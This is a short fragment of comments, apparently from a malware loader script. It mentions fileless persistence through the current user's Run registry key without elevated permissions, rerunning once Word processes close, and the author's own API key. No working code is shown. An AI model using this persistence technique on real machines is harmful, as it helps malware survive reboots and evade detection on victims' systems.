...
# adds persistence by adding a value to the current user Run registry key (Loader) - no files wrriten to disk + no high-level permissions are required
...
# if all word processes were closed, run from the beginning [change this line, this uses my api key]
